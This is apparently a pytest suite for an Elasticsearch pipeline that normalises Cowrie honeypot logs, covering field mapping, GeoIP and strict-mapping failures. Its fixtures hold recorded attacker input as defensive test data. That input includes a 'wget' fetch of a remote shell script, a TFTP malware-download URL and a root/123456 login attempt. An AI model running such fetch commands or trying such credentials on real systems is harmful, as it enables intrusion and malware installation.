import pytest
from elasticsearch import BadRequestError

from app.config import get_settings
from app.es.bootstrap import PIPELINE_ID, bootstrap_es
from app.es.client import get_es

COWRIE_COMMAND_EVENT = {
    "eventid": "cowrie.command.input",
    "timestamp": "2026-08-20T10:15:03.421000Z",
    "session": "a1b2c3d4e5f6",
    "src_ip": "185.220.101.44",
    "src_port": 51234,
    "dst_port": 2222,
    "input": "wget http://198.51.100.7/x.sh",
    "message": "CMD: wget http://198.51.100.7/x.sh",
    "sensor": "cowrie-01",
}

COWRIE_LOGIN_EVENT = {
    "eventid": "cowrie.login.failed",
    "timestamp": "2026-08-20T10:14:58.100000Z",
    "session": "a1b2c3d4e5f6",
    "src_ip": "185.220.101.44",
    "username": "root",
    "password": "123456",
}


async def _simulate(doc: dict) -> dict:
    await bootstrap_es()
    result = await get_es().ingest.simulate(id=PIPELINE_ID, docs=[{"_source": doc}])
    entry = result["docs"][0]
    assert "error" not in entry, entry
    return entry["doc"]["_source"]


@pytest.mark.asyncio
async def test_command_event_maps_to_ecs() -> None:
    src = await _simulate(COWRIE_COMMAND_EVENT)

    assert src["source"]["ip"] == "185.220.101.44"
    assert src["source"]["port"] == 51234
    assert src["destination"]["port"] == 2222
    assert src["session"]["id"] == "a1b2c3d4e5f6"
    assert src["event"]["action"] == "cowrie.command.input"
    assert src["event"]["category"] == "process"
    assert src["process"]["command_line"] == "wget http://198.51.100.7/x.sh"
    assert src["@timestamp"].startswith("2026-08-20T10:15:03")
    assert "message" not in src
    assert "sensor" not in src


@pytest.mark.asyncio
async def test_login_event_maps_to_authentication_failure() -> None:
    src = await _simulate(COWRIE_LOGIN_EVENT)

    assert src["event"]["category"] == "authentication"
    assert src["event"]["outcome"] == "failure"
    assert src["credential"]["username"] == "root"
    assert src["user"]["name"] == "root"


@pytest.mark.asyncio
async def test_nested_cowrie_fields_from_filebeat_flatten_and_map_correctly() -> None:
    """Filebeat ships Cowrie's fields nested under "cowrie.*" (see
    infra/filebeat/filebeat.yml) rather than at document root, to avoid a
    field-name collision with Filebeat's own metadata. The pipeline's first
    processor flattens that namespace back onto the root before the
    rename/remove processors above run. This indexes a Filebeat-shaped
    document through the real pipeline (not just _simulate) and confirms the
    flattened, renamed fields land correctly in the real index."""
    await bootstrap_es()
    settings = get_settings()
    doc = {
        "cowrie": {
            "eventid": "cowrie.command.input",
            "session": "test-flatten-nested",
            "input": "id",
            "src_ip": "203.0.113.9",
            "timestamp": "2026-08-20T10:15:03.421000Z",
        },
        "honeypot": {"id": "cowrie-01", "name": "Cowrie SSH (med-ws-04)"},
        # This simulates Filebeat-shipped, live-shaped traffic (not seed
        # corpus data), so it carries the same labels.seeded: False that
        # live traffic gets stamped with -- not True.
        "labels": {"seeded": False},
    }
    resp = await get_es().index(
        index=settings.es_index, document=doc, pipeline=PIPELINE_ID, refresh=True
    )
    try:
        fetched = await get_es().get(index=settings.es_index, id=resp["_id"])
        src = fetched["_source"]

        assert src["process"]["command_line"] == "id"
        assert src["session"]["id"] == "test-flatten-nested"
        assert src["source"]["ip"] == "203.0.113.9"
        assert src["honeypot"]["id"] == "cowrie-01"
        assert "cowrie" not in src
    finally:
        await get_es().delete(index=settings.es_index, id=resp["_id"])


@pytest.mark.asyncio
async def test_unrecognized_cowrie_field_is_rejected_not_silently_dropped() -> None:
    """dynamic:strict must be the fail-loud backstop for any Cowrie field that
    is neither promoted (renamed) nor recognised as noise (removed) by the
    pipeline. A prior version of infra/filebeat/filebeat.yml dropped Filebeat's
    entire nested "cowrie" namespace itself after promoting a hand-picked list
    of fields, which meant an unlisted field vanished silently -- no error,
    no log line. It must instead surface as a strict_dynamic_mapping_exception
    that names the offending field, exactly like the "uuid" field did the
    first time live Cowrie traffic hit this pipeline."""
    await bootstrap_es()
    settings = get_settings()
    doc = {
        "cowrie": {
            "eventid": "cowrie.command.input",
            "session": "test-strict-mapping",
            "input": "ls",
            "mystery_field": "should not silently vanish",
        }
    }

    with pytest.raises(BadRequestError) as exc_info:
        await get_es().index(index=settings.es_index, document=doc, pipeline=PIPELINE_ID)

    message = str(exc_info.value)
    assert "strict_dynamic_mapping_exception" in message
    assert "mystery_field" in message


# --- GeoIP --------------------------------------------------------------------
#
# The dangerous state is the one a fresh install is in: no GeoLite2 database
# yet. The geoip processor then tags every document, and under dynamic:strict an
# unmapped `tags` field rejects the event -- ingest would stop. These tests hold
# whichever state the cluster is in; the country assertion needs the database.


async def _geoip_database_present() -> bool:
    # The COUNTRY database on a node, not "any database": the downloader fetches
    # ASN, City and Country separately, and ASN arriving first made a count > 0
    # look like readiness.
    stats = await get_es().ingest.geo_ip_stats()
    return any(
        db["name"] == "GeoLite2-Country.mmdb"
        for node in stats["nodes"].values()
        for db in node.get("databases", [])
    )


@pytest.mark.asyncio
async def test_a_live_shaped_event_is_accepted_whatever_the_geoip_database_state() -> None:
    """Indexed into the REAL index through the real pipeline, as Filebeat does.

    `_simulate` would show a stray tag but not the rejection; only indexing
    under the real strict mapping proves the event is not refused.
    """
    await bootstrap_es()
    settings = get_settings()
    doc = {
        "cowrie": {
            "eventid": "cowrie.command.input",
            "session": "test-geoip-accepted",
            "input": "id",
            "src_ip": "8.8.8.8",
            "timestamp": "2026-08-20T10:15:03.421000Z",
        },
        "honeypot": {"id": "cowrie-01", "name": "Cowrie SSH (med-ws-04)"},
        "labels": {"seeded": False},
    }
    resp = await get_es().index(
        index=settings.es_index, document=doc, pipeline=PIPELINE_ID, refresh=True
    )
    try:
        src = (await get_es().get(index=settings.es_index, id=resp["_id"]))["_source"]
        assert "tags" not in src
        assert "tmp_geo" not in src
    finally:
        await get_es().delete(index=settings.es_index, id=resp["_id"])


@pytest.mark.asyncio
async def test_a_private_address_gets_no_country_and_no_leftovers() -> None:
    src = await _simulate({**COWRIE_COMMAND_EVENT, "src_ip": "172.19.0.1"})

    assert "country" not in src["source"]
    assert "tags" not in src
    assert "tmp_geo" not in src


@pytest.mark.asyncio
async def test_a_country_already_present_is_kept() -> None:
    src = await _simulate(
        {**COWRIE_COMMAND_EVENT, "src_ip": "8.8.8.8", "source": {"country": "XX"}}
    )

    assert src["source"]["country"] == "XX"


@pytest.mark.asyncio
async def test_a_public_address_is_placed_in_a_country() -> None:
    await bootstrap_es()
    if not await _geoip_database_present():
        pytest.skip(
            "Elasticsearch has not downloaded GeoLite2 yet (it fetches lazily, "
            "and needs internet); the leak/acceptance tests above still ran"
        )
    src = await _simulate({**COWRIE_COMMAND_EVENT, "src_ip": "8.8.8.8"})

    assert src["source"]["country"] == "US"


@pytest.mark.asyncio
async def test_a_telnet_event_keeps_its_protocol() -> None:
    """Cowrie stamps every event with `protocol`. It used to be removed as
    noise, so the `ssh` default below it labelled every telnet session ssh."""
    telnet = await _simulate({**COWRIE_COMMAND_EVENT, "protocol": "telnet", "dst_port": 2223})
    assert telnet["network"]["protocol"] == "telnet"
    assert "protocol" not in telnet

    nested = await _simulate({"cowrie": {**COWRIE_COMMAND_EVENT, "protocol": "telnet"}})
    assert nested["network"]["protocol"] == "telnet"


@pytest.mark.asyncio
async def test_an_event_without_a_protocol_still_defaults_to_ssh() -> None:
    assert (await _simulate(COWRIE_COMMAND_EVENT))["network"]["protocol"] == "ssh"


# --- live-honeypot event shapes (first seen on gcp-wild-01, 2026-10-18) -------
#
# Both were dead-lettered by the strict mapping on the first day of real
# traffic. Each is now accepted -- through the real pipeline into the real
# index -- and the guard each fix was careful to keep is held too.

TELNET_OPTION = {
    "eventid": "cowrie.telnet.option",
    "timestamp": "2026-10-18T15:14:53.805082Z",
    "session": "test-telnet-option",
    "src_ip": "119.167.1.61",
    "src_port": 36090,
    "dst_port": 2223,
    "protocol": "telnet",
    "command": "WILL",
    "option_byte": 31,
    "option_name": "NAWS",
    "message": "Telnet WILL NAWS",
}

DOWNLOAD_FAILED = {
    "eventid": "cowrie.session.file_download.failed",
    "timestamp": "2026-10-18T14:56:01.216888Z",
    "session": "test-download-failed",
    "src_ip": "42.2.12.41",
    "src_port": 45194,
    "dst_port": 2223,
    "protocol": "telnet",
    "url": "tftp://130.12.180.212:69/x86_64",
    "error": "TFTP: Transfer timed out",
    "late": True,
    "message": "Attempt to download file(s) from URL (tftp://...) failed",
}


async def _index_and_fetch(doc: dict) -> dict:
    await bootstrap_es()
    es = get_es()
    result = await es.index(
        index=get_settings().es_index, document={"cowrie": doc}, pipeline=PIPELINE_ID, refresh=True
    )
    try:
        return (await es.get(index=result["_index"], id=result["_id"]))["_source"]
    finally:
        await es.delete(index=result["_index"], id=result["_id"], refresh=True)


@pytest.mark.asyncio
async def test_a_telnet_option_event_is_indexed_without_its_negotiation_fields() -> None:
    src = await _index_and_fetch(TELNET_OPTION)
    assert src["event"]["action"] == "cowrie.telnet.option"
    assert src["network"]["protocol"] == "telnet"
    assert not {"command", "option_byte", "option_name"} & src.keys()


@pytest.mark.asyncio
async def test_a_failed_download_keeps_its_url_and_reason() -> None:
    src = await _index_and_fetch(DOWNLOAD_FAILED)
    assert src["file"]["url"] == "tftp://130.12.180.212:69/x86_64"
    assert src["event"]["reason"] == "TFTP: Transfer timed out"
    assert "error" not in src


@pytest.mark.asyncio
async def test_an_error_object_on_that_event_still_fails_loudly() -> None:
    """Filebeat reports a malformed log line as an `error` OBJECT. The rename
    above takes only Cowrie's STRING, so this must still be refused."""
    await bootstrap_es()
    doc = {**DOWNLOAD_FAILED, "error": {"message": "parse failure", "type": "json"}}
    with pytest.raises(BadRequestError) as exc_info:
        await get_es().index(
            index=get_settings().es_index, document={"cowrie": doc}, pipeline=PIPELINE_ID
        )
    assert "strict_dynamic_mapping_exception" in str(exc_info.value)


@pytest.mark.asyncio
async def test_command_is_removed_only_from_telnet_options() -> None:
    """`command` is protocol noise on a telnet option and nowhere else known:
    on any other event it must still be refused, not silently dropped."""
    await bootstrap_es()
    doc = {**COWRIE_COMMAND_EVENT, "command": "WILL"}
    with pytest.raises(BadRequestError) as exc_info:
        await get_es().index(
            index=get_settings().es_index, document={"cowrie": doc}, pipeline=PIPELINE_ID
        )
    assert "command" in str(exc_info.value)


TELNET_ERROR = {
    "eventid": "cowrie.telnet.error",
    "timestamp": "2026-10-19T02:38:04.750446Z",
    "session": "test-telnet-error",
    "src_ip": "203.0.113.7",
    "src_port": 30765,
    "dst_port": 2223,
    "protocol": "telnet",
    "error": "('Stumped', b'\x01')",
    "message": "Telnet protocol error ('Stumped', b'\x01'); dropping connection",
}


@pytest.mark.asyncio
async def test_a_telnet_protocol_error_keeps_its_reason() -> None:
    """A port scanner's non-Telnet bytes; first seen on the GCP evaluation Cowrie."""
    src = await _index_and_fetch(TELNET_ERROR)
    assert src["event"]["action"] == "cowrie.telnet.error"
    assert src["event"]["reason"] == "('Stumped', b'\x01')"
    assert "error" not in src
